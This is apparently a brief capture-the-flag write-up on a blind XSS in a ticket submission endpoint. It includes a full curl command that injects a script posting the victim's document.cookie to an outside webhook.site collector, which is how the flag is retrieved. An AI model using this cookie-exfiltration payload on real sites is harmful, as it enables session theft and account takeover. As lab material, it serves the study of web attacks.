Create a hook: webhook.site
My web hook -> https://webhook.site/eff815dc-37db-43cb-813e-4fa047de3dfa
My target:138.68.186.7:31990

---
We have to do (blind) XSS to inject a payload that allow us to load a cookie that is stored in the server. We trick the server to return the internal cookie

```bash
curl -X POST http://138.68.186.7:31990/api/submit_ticket --header 'Content-Type: application/json' -d '{"name":"test", "email":"test", "website":"test", "message":"<script>new Image().src=\"https://webhook.site/eff815dc-37db-43cb-813e-4fa047de3dfa/?c=\"+document.cookie;</script>"}'
```
Once the server receives the request and process it, our hook is executed.
If we check now the page <webhook.site> we will see a new connection there.
In that connection, we will find the flag in the cookies (document.cookie) 

![[webhook_page.png]]
